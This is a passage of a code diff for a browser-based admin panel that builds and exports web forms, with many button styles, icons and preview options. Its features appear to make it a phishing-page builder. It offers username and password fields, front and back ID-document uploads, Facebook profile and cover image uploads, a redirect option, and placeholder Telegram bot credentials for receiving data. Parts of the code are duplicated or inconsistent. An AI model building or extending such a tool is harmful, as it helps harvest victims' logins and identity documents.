+  <option value="fire-glow">Fire Glow</option>
+  <option value="ice-glow">Ice Glow</option>
+  <option value="shadow-left">Shadow Left</option>
+  <option value="shadow-right">Shadow Right</option>
+  <option value="shadow-top">Shadow Top</option>
+  <option value="shadow-bottom">Shadow Bottom</option>
+  <option value="shake-hover">Shake Hover</option>
+  <option value="bounce-hover">Bounce Hover</option>
+  <option value="spin-hover">Spin Hover</option>
+  <option value="scale-hover">Scale Hover</option>
+  <option value="flash-hover">Flash Hover</option>
+  <option value="wave-border">Wave Border</option>
+  <option value="glow-pulse">Glow Pulse</option>
+</select>
+  
+  <select id="btnShape">
+  <option value="rounded">Rounded</option>
+  <option value="pill">Pill</option>
+  <option value="square">Square</option>
+  <option value="sharp">Sharp</option>
+  <option value="circle">Circle</option>
+  <option value="semi-round">Semi Round</option>
+  <option value="top-round">Top Round</option>
+  <option value="bottom-round">Bottom Round</option>
+  <option value="left-round">Left Round</option>
+  <option value="right-round">Right Round</option>
+  <option value="blob">Blob</option>
+  <option value="diamond">Diamond</option>
+  <option value="skew">Skew</option>
+  <option value="parallelogram">Parallelogram</option>
+  <option value="cut-corner">Cut Corner</option>
+  <option value="double-border">Double Border</option>
+  <option value="thick-border">Thick Border</option>
+  <option value="outline">Outline</option>
+  <option value="ghost">Ghost</option>
+  <option value="neumorphic">Neumorphic</option>
+</select>
+
+  <label>Button Size</label>
+<select id="btnSize">
+  <option value="sm">Small</option>
+  <option value="md" selected>Medium</option>
+  <option value="lg">Large</option>
+  <option value="custom">Custom</option>
+</select>
+
+  <label><input type="checkbox" id="btnFullWidth"> Full Width</label>
+  <label><input type="checkbox" id="btnGradient"> Gradient</label>
+ <label><input type="checkbox" id="btnStickyMobile"> Sticky Mobile</label>
+
+<div id="customBtnSizeWrap" style="display:none;">
+  <label>Custom Padding (e.g. 10px 18px)</label>
+  <input id="btnPadding" placeholder="12px 20px">
+</div>
+</div>
+
+<div class="section">
+  <h3>🔍 Small Live Button Preview</h3>
+  <div id="miniBtnPreview" style="
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+    padding:10px;
+    border:1px solid #ddd;
+    border-radius:8px;
+    background:#fafafa;">
+  </div>
+</div>
+
+<!-- Extra Buttons -->
+<div class="section">
+  <h3>➕ Extra Buttons</h3>
+
+  <p style="font-size:13px;color:#555;margin:6px 0 12px;">
+    Add additional custom buttons anywhere on the page.
+    Use these for external links, actions, promotions, or important navigation.
+    You can control the button text, link, color, size, and visibility.
+  </p>
+
+<label>Button Alignment</label>
+<select id="newBtnAlign">
+  <option value="none">None</option>
+  <option value="left">Left</option>
+  <option value="center" selected>Center</option>
+  <option value="right">Right</option>
+</select>
+
+  <label>Upload Image (Optional): 
+  <input type="file" id="newBtnImage" accept="image/*">
+  </label>
+
+  <label>Description (Optional): 
+  <input id="newBtnDesc" placeholder="Small text under button/image">
+</label>
+
+  <label>Text: <input id="newBtnText" placeholder="Enter button text"></label>
+  <label>Link URL: <input id="newBtnLink" value="https://example.com"></label>
+  <label>Color: <input type="color" id="newBtnColor" value="#1976d2"></label>
+  <label>Size (px): <input type="number" id="newBtnSize" value="44" min="20" max="200"></label>
+  <label>Show Button: <input type="checkbox" id="newBtnShow" checked></label>
+  
+  <div class="btn-group">
+  <button class="press-3d" onclick="addExtraButton()">
+    ➕ Add Extra Button
+  </button>
+
+  <button class="press-3d light" onclick="clearAllExtraButtons()">
+    🗑 Clear All Extra Buttons
+  </button>
+</div>
+
+<div id="extraButtonsList" style="margin-top:10px;"></div>
+</div>
+</div>
+
+<!-- Draggable Lines -->
+<div class="section">
+  <h3>➖ Draggable Lines</h3>
+
+  <label>Line Type</label>
+  <select id="linePreset">
+    <optgroup label="Basic Geometric & Orientation">
+      <option value="straight">Straight Line</option>
+      <option value="horizontal">Horizontal Line</option>
+      <option value="vertical">Vertical Line</option>
+      <option value="diagonal">Diagonal Line</option>
+      <option value="curved">Curved Line</option>
+      <option value="zigzag">Zigzag Line</option>
+      <option value="wavy">Wavy Line</option>
+    </optgroup>
+
+    <optgroup label="Patterned & Stylized">
+      <option value="solid">Solid Line</option>
+      <option value="dashed">Dashed Line</option>
+      <option value="dotted">Dotted Line</option>
+      <option value="thick">Thick Line</option>
+      <option value="thin">Thin Line</option>
+    </optgroup>
+
+    <optgroup label="Directional & Design">
+      <option value="arrow">Directional Line</option>
+      <option value="spiral">Spiral Line</option>
+      <option value="flow">Flowing Line</option>
+      <option value="leading">Leading Line</option>
+    </optgroup>
+
+    <optgroup label="Artistic">
+      <option value="expressive">Expressive Line</option>
+      <option value="contour">Contour Line</option>
+      <option value="hatching">Hatching Lines</option>
+      <option value="crosshatch">Cross-Hatching</option>
+    </optgroup>
+  </select>
+
+  <label>Color</label>
+  <input type="color" id="lineColor" value="#000000">
+
+  <label>Thickness</label>
+  <input type="number" id="lineSize" value="2" min="1" max="12">
+  <button onclick="addLine()">➕ Add Line</button>
+
+<div id="linesList"></div>
+</div>
+
+<!-- REDIRECT -->
+<div class="section">
+  <h3>🔗 Redirect</h3>
+  <label><input type="checkbox" id="enableRedirect"> Enable Redirect</label>
+  <input id="redirectURL">
+</div>
+
+<!-- FOOTER -->
+<div class="section">
+  <h3>🧾 Footer</h3>
+  <input id="footerText" value="© 2025 Your Company. All rights reserved.">
+</div>
+
+<!-- Generate Form -->
+<div class="section">
+  <button id="generateFormButton" class="press-3d" onclick="generateForm()">
+  Generate Form
+</button>
+
+  <div id="linkArea" class="linkBox" style="display:none; margin-top:10px;"></div>
+  
+  <div id="generatedTools" style="margin-top:15px; display:none;">
+    <input type="text" id="generatedLink" readonly style="width:100%; padding:8px; margin-bottom:5px;">
+    
+    <button onclick="copyGeneratedLink()">📋 Copy Link</button>
+    <button onclick="downloadHTML()">⬇️ Download HTML</button>
+    <button onclick="copyHTML()">📄 Copy HTML</button>
+    
+    <div id="generatedBox" style="
+  display:none;
+  margin-top:20px;
+  padding:15px;
+  background:#e8f5e9;
+  border:1px solid #c8e6c9;
+  border-radius:10px;
+">
+
+  <h3 style="margin:0 0 10px;">✅ Form Generated Successfully</h3>
+
+  <input id="generatedLinkInput"
+    style="width:100%;padding:8px;margin-bottom:10px"
+    readonly>
+
+  <div style="display:flex;gap:10px;flex-wrap:wrap;">
+    <button onclick="copyGeneratedLink()">📋 Copy Link</button>
+    <button onclick="downloadHTML()">⬇ Download HTML</button>
+    <button onclick="copyHTML()">📄 Copy HTML</button>
+  </div>
+
+</div>
+  </div>
+</div>
+
+<!-- PREVIEW -->
+<div style="flex:0 0 540px">
+  <label>Live Preview</label>
+  <div class="previewWrap">
+    <div id="preview"></div>
+  </div>
+</div>
+
+</div>
+</div>
+<script src="https://www.youtube.com/iframe_api"></script>
+<script>
+const $ = id => document.getElementById(id);
+
+let ytApiReady = false;
+
+function setTheme(theme) {
+  const admin = document.getElementById("adminPanel");
+
+  if (!admin) {
+    console.error("adminPanel not found");
+    return;
+  }
+
+  // remove all theme classes
+  admin.className = "";
+
+  // apply selected theme
+  if (theme) {
+    admin.classList.add(theme);
+  }
+}
+
+
+// 🎨 ALL AVAILABLE THEMES
+const themes = [
+  "dark-mode",
+  "blue-theme",
+  "pink-theme",
+  "green-theme",
+  "purple-theme",
+  "orange-theme",
+  "red-theme",
+  "teal-theme",
+  "gold-theme",
+  "cyber-theme",
+  "glass-theme",
+  "neon-theme",
+  "midnight-theme",
+  "sunset-theme",
+  "ocean-theme",
+  "forest-theme",
+  "lavender-theme",
+  "rose-theme",
+  "ice-theme",
+  "fire-theme"
+];
+
+// 🎯 APPLY THEME (ADMIN ONLY)
+function setTheme(theme) {
+  const admin = document.getElementById("adminPanel");
+
+  // remove all themes
+  admin.classList.remove(...themes);
+
+  // add selected
+  if (theme) admin.classList.add(theme);
+}
+
+// 🌙 TOGGLE DARK MODE (ADMIN ONLY)
+function toggleDarkMode() {
+  const admin = document.getElementById("adminPanel");
+
+  admin.classList.toggle("dark-mode");
+}
+
+function setTheme(theme) {
+  const admin = document.getElementById("adminPanel");
+  admin.classList.remove(...themes);
+
+  if (theme) {
+    admin.classList.add(theme);
+    localStorage.setItem("adminTheme", theme);
+  }
+}
+
+// load saved theme
+window.addEventListener("DOMContentLoaded", () => {
+  const saved = localStorage.getItem("adminTheme");
+  if (saved) setTheme(saved);
+});
+
+// ==============================
+// 👁 ADD THEM HERE (CORRECT SPOT)
+// ==============================
+
+function getEyeIcon(state, style) {
+  if (style === "none") return "";
+  if (style === "text") {
+    return state === "open" ? "Hide" : "Show";
+  }
+
+  if (style === "classic") {
+    return state === "open" ? "🙈" : "👁";
+  }
+
+  return state === "open" ? "👁‍🗨" : "👁";
+}
+
+function togglePassword(el) {
+  const wrapper = el.closest("div");
+  const input = wrapper.querySelector(".passwordField");
+  const style = document.getElementById("eyeIconStyle")?.value || "emoji";
+
+  if (!input) return;
+
+  if (input.type === "password") {
+    input.type = "text";
+    el.innerHTML = getEyeIcon("open", style);
+  } else {
+    input.type = "password";
+    el.innerHTML = getEyeIcon("closed", style);
+  }
+}
+
+// ===============================
+// 🖼 FACEBOOK IMAGE UPLOAD (PASTE HERE)
+// ===============================
+let fbProfilePicData = "";
+let fbCoverPicData = "";
+
+document.addEventListener("DOMContentLoaded", () => {
+
+  document.getElementById("fbProfilePic")?.addEventListener("change", function () {
+    const file = this.files[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = e => {
+      fbProfilePicData = e.target.result;
+      renderPreview();
+    };
+    reader.readAsDataURL(file);
+  });
+
+  document.getElementById("fbCoverPic")?.addEventListener("change", function () {
+    const file = this.files[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = e => {
+      fbCoverPicData = e.target.result;
+      renderPreview();
+    };
+    reader.readAsDataURL(file);
+  });
+
+});
+
+// ===============================
+// 🚀 INIT BUTTON
+// ===============================
+document.addEventListener("DOMContentLoaded", function () {
+
+  if (editId) {
+    isEditMode = true;
+
+    db.collection("forms").doc(editId).get().then(doc => {
+      if (!doc.exists) return;
+
+      const data = doc.data();
+
+      document.getElementById("title").value = data.title || "";
+      document.getElementById("description").value = data.description || "";
+      document.getElementById("buttonText").value = data.buttonText || "";
+    });
+  }
+
+  const generateBtn = document.getElementById("generateFormButton");
+
+  if (generateBtn) {
+    generateBtn.addEventListener("click", generateForm);
+  }
+
+});
+
+// 🔐 YOUR TELEGRAM CONFIG (ADD THIS ONCE AT TOP)
+const TELEGRAM_BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE";
+const TELEGRAM_CHAT_ID = "PUT_YOUR_CHAT_ID_HERE";
+
+// ===============================
+// 🏗 1️⃣ GENERATE & SAVE FORM
+// ===============================
+async function generateForm() {
+  try {
+
+    if (!window.firebase || !window.db) {
+      alert("Firebase not initialized.");
+      return;
+    }
+
+    const frontUrl = $("idFrontFile")?.dataset.uploadedUrl || "";
+    const backUrl = $("idBackFile")?.dataset.uploadedUrl || "";
+
+    const fields = [];
+
+    // 🔐 Auth fields
+    if ($("addAuth")?.checked) {
+      fields.push({
+        type: "text",
+        name: "username",
+        label: "Username",
+        placeholder: $("usernamePlaceholder")?.value || "Username"
+      });
+      fields.push({
+        type: "password",
+        name: "password",
+        label: "Password",
+        placeholder: $("passwordPlaceholder")?.value || "Password"
+      });
+    }
+
+    // ➕ Extra fields
+    $("extraFields")?.value
+      ?.split("\n")
+      .map(f => f.trim())
+      .filter(Boolean)
+      .forEach(f => {
+        fields.push({
+          type: "text",
+          label: f,
+          name: f.replace(/\s+/g,'_').toLowerCase(),
+          placeholder: f
+        });
+      });
+
+    // 🪪 ID Uploads
+    if ($("chkIdFront")?.checked) {
+      fields.push({
+        type: "file",
+        label: $("idFrontSmallTitle")?.value || "Front Side",
+        name: "id_front",
+        url: frontUrl
+      });
+    }
+
+    if ($("chkIdBack")?.checked) {
+      fields.push({
+        type: "file",
+        label: $("idBackSmallTitle")?.value || "Back Side",
+        name: "id_back",
+        url: backUrl
+      });
+    }
+
+    // 🎯 FINAL DATA
+    const formData = {
+      title: $("title")?.value || "Untitled Form",
+      description: $("description")?.value || "",
+      fields: fields,
+
+      bgColor: $("bgColor")?.value || "#ffffff",
+      textColor: $("textColor")?.value || "#000",
+
+      btnColor: $("btnColor")?.value || "#1976d2",
+      buttonText: $("buttonText")?.value || "Submit",
+
+      createdAt: Date.now()
+    };
+
+    // 🔥 SAVE TO FIRESTORE ONLY
+const docRef = await db.collection("forms").add(formData);
+
+// ✅ Generate clean link
+const link = `${window.location.origin}/form.html?id=${docRef.id}`;
+
+// Show tools
+document.getElementById("generatedTools").style.display = "block";
+document.getElementById("generatedLink").value = link;
+
+// Save globally
+window.generatedLink = link;
+
+
+// ===============================
+// ✅ GENERATE CLEAN HTML FOR COPY
+// ===============================
+const previewContainer = document.getElementById("preview");
+
+const fullHTML = `
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>${formData.title}</title>
+</head>
+
+<body>
+
+${previewContainer.innerHTML}
+
+</body>
+</html>
+`;
+
+// ✅ Store for copy button
+window.generatedHTML = fullHTML;
+
+// Show result box
+const box = document.getElementById("generatedBox");
+const input = document.getElementById("generatedLinkInput");
+
+if (box && input) {
+  box.style.display = "block";
+  input.value = link;
+}
+
+    // 🔗 OPEN FORM
+    const formLink = `form.html?id=${docRef.id}`;
+
+document.getElementById("generatedLink").value = formLink;
+
+  } catch (err) {
+    console.error(err);
+    alert("❌ Error generating form");
+  }
+}
+
+function showExportOptions(html) {
+
+  const box = document.createElement("div");
+  box.style.position = "fixed";
+  box.style.top = "50%";
+  box.style.left = "50%";
+  box.style.transform = "translate(-50%, -50%)";
+  box.style.background = "#fff";
+  box.style.padding = "20px";
+  box.style.borderRadius = "10px";
+  box.style.zIndex = "9999";
+  box.style.width = "90%";
+  box.style.maxWidth = "600px";
+
+  box.innerHTML = `
+    <h3>Export Form</h3>
+
+    <textarea style="width:100%;height:150px;">${html.replace(/</g,"&lt;")}</textarea>
+
+    <br><br>
+
+    <button onclick="copyHTML()">📋 Copy HTML</button>
+    <button onclick="downloadHTML()">💾 Download</button>
+    <button onclick="previewHTML()">👁 Preview</button>
+    <button onclick="this.parentElement.remove()">❌ Close</button>
+  `;
+
+  document.body.appendChild(box);
+
+  window.generatedHTML = html;
+}
+
+function copyGeneratedLink() {
+  navigator.clipboard.writeText(window.generatedLink);
+  alert("Link copied!");
+}
+
+function downloadHTML() {
+  const blob = new Blob([window.generatedHTML], { type: "text/html" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "form.html";
+  a.click();
+}
+
+function copyHTML() {
+  navigator.clipboard.writeText(window.generatedHTML);
+  alert("HTML copied!");
+}
+
+function showShareOptions(link, formData) {
+
+  let box = document.getElementById("shareBox");
+
+  if (!box) {
+    box = document.createElement("div");
+    box.id = "shareBox";
+    document.body.appendChild(box);
+  }
+
+  box.style.display = "block";
+  box.style.marginTop = "20px";
+
+  box.innerHTML = `
+    <div style="padding:15px;background:#f1f1f1;border-radius:10px;">
+      
+      <h3>🔗 Share Your Form</h3>
+
+      <input id="shareLinkInput" value="${link}" style="width:100%;padding:8px">
+
+      <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;">
+        
+        <button onclick="copyLink()">📋 Copy Link</button>
+
+        <button onclick="downloadHTML()">
+          ⬇ Download HTML
+        </button>
+
+        <button onclick="copyHTML()">
+          📄 Copy HTML Code
+        </button>
+
+      </div>
+    </div>
+  `;
+}
+
+/* =====================================
+   🔥 ULTRA EFFECT MASTER LIST
+===================================== */
+
+const allEffects = [
+  "glow-blue","glow-red","glow-green",
+  "rainbow-glow","cyber-glow","fire-glow",
+  "ice-glow","gradient-border","glow-pulse",
+  "press-3d","ripple",
+  "soft-shadow","hard-shadow",
+  "shadow-left","shadow-right","shadow-top","shadow-bottom",
+  "floating","inner-glow",
+  "scale-hover","spin-hover","bounce-hover","shake-hover",
+  "flash-hover","wave-border",
+  "neumorphic","glass","neon","outer-ring"
+];
+
+/* =====================================
+   🎬 BUTTON ANIMATION MASTER LIST
+===================================== */
+
+const allButtonAnimations = [
+
+  // Basic
+  "fade-in","fade-out","slide-up","slide-down",
+  "slide-left","slide-right","zoom-in","zoom-out",
+
+  // Bounce
+  "bounce","bounce-in","bounce-out","bounce-top",
+  "bounce-bottom","bounce-left","bounce-right",
+
+  // Rotate
+  "rotate","rotate-in","rotate-out","rotate-3d",
+  "spin","spin-fast","spin-slow",
+
+  // Pulse
+  "pulse","pulse-fast","pulse-slow",
+  "heartbeat","pulse-ring",
+
+  // Shake
+  "shake","shake-hard","shake-x","shake-y",
+
+  // Flip
+  "flip-x","flip-y","flip-3d",
+
+  // Glow
+  "glow","glow-intense","neon-flash",
+
+  // Elastic
+  "elastic","rubber-band","swing",
+
+  // Floating
+  "float","float-up","float-down",
+
+  // Flash
+  "flash","flash-fast","blink",
+
+  // Wave
+  "wave","wave-border","wave-glow",
+
+  // Advanced
+  "typewriter","blur-in","blur-out",
+  "expand","contract",
+  "scale-hover","scale-click",
+  "skew","tilt-left","tilt-right",
+
+  // Add up to 100 easily
+];
+
+/* =====================================
+   🔥 ICON DATABASE (FIXED VERSION)
+===================================== */
+
+const iconDatabase = [
+
+  // Social
+  { name:"facebook", icon:"📘", category:"social" },
+  { name:"instagram", icon:"📸", category:"social" },
+  { name:"youtube", icon:"▶️", category:"social" },
+  { name:"twitter", icon:"🐦", category:"social" },
+  { name:"tiktok", icon:"🎵", category:"social" },
+
+  // Payment
+  { name:"card", icon:"💳", category:"payment" },
+  { name:"bank", icon:"🏦", category:"payment" },
+  { name:"money", icon:"💰", category:"payment" },
+  { name:"paypal", icon:"💵", category:"payment" },
+
+  // Support
+  { name:"lock", icon:"🔒", category:"cards" },
+  { name:"shield", icon:"🛡️", category:"cards" },
+  { name:"secure", icon:"🔐", category:"cards" },
+
+  // Emoji
+  { name:"fire", icon:"🔥", category:"emoji" },
+  { name:"star", icon:"⭐", category:"emoji" },
+  { name:"rocket", icon:"🚀", category:"emoji" },
+  { name:"diamond", icon:"💎", category:"emoji" }
+
+];
+
+function createImagePreview(input) {
+  const preview = document.createElement("img");
+  preview.style.width = "100%";
+  preview.style.maxHeight = "140px";
+  preview.style.objectFit = "cover";
+  preview.style.borderRadius = "6px";
+  preview.style.marginTop = "5px";
+  preview.style.display = "none";
+
+  input.addEventListener("change", function () {
+    const file = input.files[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = function (e) {
+      preview.src = e.target.result;
+      preview.style.display = "block";
+    };
+    reader.readAsDataURL(file);
+  });
+
+  return preview;
+}
+
+/* ===============================
+   LIVE PREVIEW FUNCTION
+================================ */
+
+function renderPreview() {
+  const preview = document.getElementById("Preview");
+  if (!preview) return;
+
+  preview.innerHTML = "";
+
+  if (formFields && formFields.length) {
+  formFields.forEach(field => {
+    const wrapper = document.createElement("div");
+    wrapper.style.marginBottom = "10px";
+
+    const label = document.createElement("label");
+    label.textContent = field.label;
+    wrapper.appendChild(label);
+
+    if (field.type === "textarea") {
+      const textarea = document.createElement("textarea");
+      textarea.placeholder = field.label;
+      wrapper.appendChild(textarea);
+    } else {
+      const input = document.createElement("input");
+      input.type = field.type;
+      input.placeholder = field.label;
+      wrapper.appendChild(input);
+    }
+
+    preview.appendChild(wrapper);
+  });
+}
+      
+  /* =========================
+   🔥 PRO BUTTON SYSTEM
+========================= */
+
+const btnWrap = document.createElement("div");
+btnWrap.style.display = "flex";
+btnWrap.style.flexDirection = "column";
+btnWrap.style.gap = "12px";
+btnWrap.style.marginTop = "20px";
+
+// ===== ALIGN ENGINE =====
+function getAlign(position) {
+  return position === "left"
+    ? "flex-start"
+    : position === "right"
+    ? "flex-end"
+    : "center";
+}
+
+// ===== SIZE ENGINE =====
+function getPadding(size) {
+  if (size === "sm") return "8px 14px";
+  if (size === "lg") return "16px 28px";
+  return "12px 20px";
+}
+
+// ===== BUTTON FACTORY =====
+function createProButton(text, color, position) {
+  const btn = document.createElement("button");
+
+  const selectedIcon = $("iconPicker")?.value;
+const iconSize = $("iconSize")?.value || 18;
+
+if (selectedIcon) {
+  const span = document.createElement("span");
+  span.textContent = selectedIcon;
+  span.style.fontSize = iconSize + "px";
+  span.style.marginRight = "8px";
+  btn.appendChild(span);
+}
+
+const textNode = document.createElement("span");
+textNode.textContent = text;
+btn.appendChild(textNode);
+  btn.style.background = color;
+  btn.style.color = "#fff";
+  btn.style.border = "none";
+  btn.style.cursor = "pointer";
+  btn.style.fontWeight = "600";
+  btn.style.padding = getPadding($("btnSize")?.value);
+  btn.style.alignSelf = getAlign(position);
+
+  /* ===============================
+     🔄 RESET ALL EFFECT CLASSES
+  =============================== */
+  btn.className = "";
+
+  /* ===============================
+     🎨 APPLY SURROUND EFFECT
+  =============================== */
+  const effect = $("btnEffect")?.value;
+  if (effect && effect !== "none") {
+    btn.classList.add(effect);
+  }
+
+  /* ===============================
+     🚀 APPLY ULTRA EFFECTS (MULTI)
+  =============================== */
+  const ultraSelect = $("btnUltraEffect");
+
+  if (ultraSelect) {
+    const selectedEffects = Array.from(ultraSelect.selectedOptions)
+      .map(opt => opt.value)
+      .filter(val => val !== "none");
+
+    selectedEffects.forEach(effectClass => {
+      btn.classList.add(effectClass);
+    });
+  }
+
+  /* ===============================
+     🔵 SHAPE
+  =============================== */
+  if ($("btnShape")?.value === "pill") {
+    btn.style.borderRadius = "999px";
+  } else {
+    btn.style.borderRadius = "8px";
+  }
+
+  /* ===============================
+     📏 FULL WIDTH
+  =============================== */
+  if ($("btnFullWidth")?.checked) {
+    btn.style.width = "100%";
+    btn.style.alignSelf = "stretch";
+  }
+
+  /* ===============================
+     🌈 GRADIENT
+  =============================== */
+  if ($("btnGradient")?.checked) {
+    btn.style.background = "linear-gradient(45deg, #1877f2, #42a5f5)";
+  }
+  
+  /* ===============================
+   🎬 APPLY BUTTON ANIMATIONS
+================================ */
+
+const animSelect = $("btnAnimationEffect");
+
+if (animSelect) {
+
+  const selectedAnimations = Array.from(animSelect.selectedOptions)
+    .map(opt => opt.value);
+
+  selectedAnimations.forEach(anim => {
+    btn.style.animation = anim + " 1s ease";
+  });
+
+}
+
+  return btn;
+}
+
+// ===== GENERATE BUTTON =====
+if ($("showGenerateBtn")?.checked) {
+  const genBtn = createProButton(
+    $("generateBtnText")?.value || "Generate",
+    "#444",
+    $("btnPosition")?.value
+  );
+  btnWrap.appendChild(genBtn);
+}
+
+// ===== STICKY MOBILE SUBMIT =====
+if ($("btnStickyMobile")?.checked) {
+  btnWrap.style.position = "sticky";
+  btnWrap.style.bottom = "0";
+  btnWrap.style.background = "#fff";
+  btnWrap.style.padding = "10px 0";
+}
+
+preview.appendChild(btnWrap);
+}
+
+/* =====================================
+   🎛 AUTO GENERATE ULTRA DROPDOWN
+===================================== */
+
+function generateUltraEffectsDropdown() {
+  const select = $("btnUltraEffect");
+  if (!select) return;
+
+  select.innerHTML = `<option value="none">None</option>`;
+
+  allEffects.forEach(effect => {
+    const opt = document.createElement("option");
+    opt.value = effect;
+    opt.textContent = effect.replace(/-/g, " ");
+    select.appendChild(opt);
+  });
+}
+
+/* ===============================
+   BUTTON LIVE UPDATE LISTENERS
+================================ */
+
+// 1️⃣ Define the function FIRST
+function generateAnimationDropdown() {
+  const select = document.getElementById("btnAnimationEffect");
+  if (!select) return;
+
+  const animations = [
+    "fade",
+    "slideUp",
+    "slideDown",
+    "slideLeft",
+    "slideRight",
+    "zoomIn",
+    "zoomOut",
+    "rotate",
+    "flipX",
+    "flipY",
+    "bounce",
+    "pulse",
+    "shake",
+    "dropIn",
+    "slideRotate",
+    "fadeLeft",
+    "fadeRight"
+  ];
+
+  select.innerHTML = "";
+
+  animations.forEach(anim => {
+    const option = document.createElement("option");
+    option.value = anim;
+    option.textContent = anim;
+    select.appendChild(option);
+  });
+}
+
+/* =====================================
+   🎯 GENERATE ICON LIST
+===================================== */
+
+function generateIconList() {
+
+  const picker = document.getElementById("iconPicker");
+  const search = document.getElementById("iconSearch");
+  const category = document.getElementById("iconCategory");
+
+  if (!picker) return;
+
+  const searchValue = search?.value.toLowerCase() || "";
+  const selectedCategory = category?.value || "all";
+
+  picker.innerHTML = "";
+
+  iconDatabase.forEach(icon => {
+
+    if (
+      (selectedCategory === "all" || icon.category === selectedCategory) &&
+      icon.name.toLowerCase().includes(searchValue)
+    ) {
+
+      const opt = document.createElement("option");
+      opt.value = icon.icon;
+      opt.textContent = icon.icon + "  " + icon.name;
+      picker.appendChild(opt);
+
+    }
+
+  });
+
+}
+
+// 2️⃣ ONE single DOMContentLoaded
+document.addEventListener("DOMContentLoaded", () => {
+
+  generateAnimationDropdown();
+  generateIconList();
+
+  $("iconSearch")?.addEventListener("input", generateIconList);
+  $("iconCategory")?.addEventListener("change", generateIconList);
+  $("iconPicker")?.addEventListener("change", renderPreview);
+  $("iconSize")?.addEventListener("input", renderPreview);
+
+  $("iconSearch")?.addEventListener("input", function() {
+    const value = this.value.toLowerCase();
+
+    const match = iconDatabase.find(icon => 
+      value.includes(icon.name)
+    );
+
+    if (match) {
+      $("iconPicker").value = match.icon; // also fix this if needed
+    }
+  });
+
+  $("iconCategory")?.addEventListener("change", generateIconList);
+
+  [
+    "showGenerateBtn",
+    "showMainBtn",
+    "buttonText",
+    "generateBtnText",
+    "btnColor",
+    "btnPosition",
+    "btnShape",
+    "btnFullWidth",
+    "btnGradient",
+    "btnStickyMobile",
+    "btnSize",
+    "btnEffect",
+    "btnUltraEffect",
+    "btnAnimationEffect"
+  ].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+
+    el.addEventListener("change", renderPreview);
+    el.addEventListener("input", renderPreview);
+  });
+
+  renderPreview();
+});
+
+document.getElementById("idFrontExample")?.addEventListener("change", function () {
+  const reader = new FileReader();
+  reader.onload = e => {
+    document.getElementById("idExampleFront").value = e.target.result;
+    renderPreview();
+  };
+  reader.readAsDataURL(this.files[0]);
+});
+
+document.getElementById("idBackExample")?.addEventListener("change", function () {
+  const reader = new FileReader();
+  reader.onload = e => {
+    document.getElementById("idExampleBack").value = e.target.result;
+    renderPreview();
+  };
+  reader.readAsDataURL(this.files[0]);
+});
+
+$("titleColor")?.addEventListener("input", e => {
+  $("titleColorHex").textContent = e.target.value;
+});
+      
+/* ===============================
+   YOUTUBE API READY
+================================ */
+
+window.onYouTubeIframeAPIReady = function () {
+  ytApiReady = true;
+  renderPreview();
+};
+
+const btnSize = document.getElementById("btnSize");
+const customWrap = document.getElementById("customBtnSizeWrap");
+
+btnSize?.addEventListener("change", () => {
+  customWrap.style.display = btnSize.value === "custom" ? "block" : "none";
+});
+
+function renderMiniButtons() {
+  const mini = $("miniBtnPreview");
+  if (!mini) return;
+
+  mini.innerHTML = "";
+
+  const effects = [
+    "glow-blue","glow-red","glow-green",
+    "gradient-border","glow-pulse",
+    "press-3d","ripple"
+  ];
+
+  effects.forEach(effect => {
+    const btn = document.createElement("button");
+    btn.textContent = effect;
+    btn.style.padding = "6px 12px";
+    btn.style.fontSize = "12px";
+    btn.style.background = "#1976d2";
+    btn.style.color = "#fff";
+    btn.style.border = "none";
+    btn.style.cursor = "pointer";
+    btn.style.borderRadius = "6px";
+
+    btn.classList.add(effect);
+
+    mini.appendChild(btn);
+  });
+}
+
+// -------------------------
+// Draggable Lines & Extra Buttons
+// -------------------------
+let draggableItems = []; // store extra buttons + lines
+
+const linePresets = {
+  straight: "────────────",
+  horizontal: "────────────",
+  vertical: "││││││││││││",
+  diagonal: "///////////",
+  curved: "~~~~~~~~~~~~",
+  zigzag: "⚡⚡⚡⚡⚡⚡",
+  wavy: "〰〰〰〰〰〰",
+
+  solid: "━━━━━━━━━━━━",
+  dashed: "— — — — — —",
+  dotted: "· · · · · ·",
+  thick: "████████████",
+  thin: "────────────",
+
+  arrow: "➜➜➜➜➜➜",
+  spiral: "🌀🌀🌀",
+  flow: "≈≈≈≈≈≈",
+  leading: "➝➝➝➝➝",
+
+  expressive: "✦✦✦✦✦",
+  contour: "▭▭▭▭▭",
+  hatching: "//// ////",
+  crosshatch: "#### ####"
+};
+
+// -------------------------
+// Dynamic Storage Arrays
+// -------------------------
+let extraButtons = [],
+    embedLinks = [],
+    customFields = [],
+    dragging = null,
+    dx = 0,
+    dy = 0;
+    
+    // ===============================
+// ID IMAGE SYSTEM (ADMIN + USER)
+// ===============================
+
+let frontExampleImage = "";
+let backExampleImage = "";
+
+// =====================
+// ADMIN EXAMPLE → FRONT
+// =====================
+document.getElementById("idFrontExample")?.addEventListener("change", function () {
+  const file = this.files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+  reader.onload = function (e) {
+    frontExampleImage = e.target.result;
+
+    const img = document.getElementById("frontPreview");
+    img.src = frontExampleImage;
+    img.style.display = "block";
+  };
+  reader.readAsDataURL(file);
+});
+
+
+// =====================
+// ADMIN EXAMPLE → BACK
+// =====================
+document.getElementById("idBackExample")?.addEventListener("change", function () {
+  const file = this.files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+  reader.onload = function (e) {
+    backExampleImage = e.target.result;
+
+    const img = document.getElementById("backPreview");
+    img.src = backExampleImage;
+    img.style.display = "block";
+  };
+  reader.readAsDataURL(file);
+});
+
+
+// =====================
+// USER UPLOAD → FRONT
+// =====================
+document.getElementById("idFrontFile")?.addEventListener("change", function () {
+  const file = this.files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+  reader.onload = function (e) {
+    const img = document.getElementById("frontPreview");
+    img.src = e.target.result;
+  };
+  reader.readAsDataURL(file);
+});
+
+
+// =====================
+// USER UPLOAD → BACK
+// =====================
+document.getElementById("idBackFile")?.addEventListener("change", function () {
+  const file = this.files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+  reader.onload = function (e) {
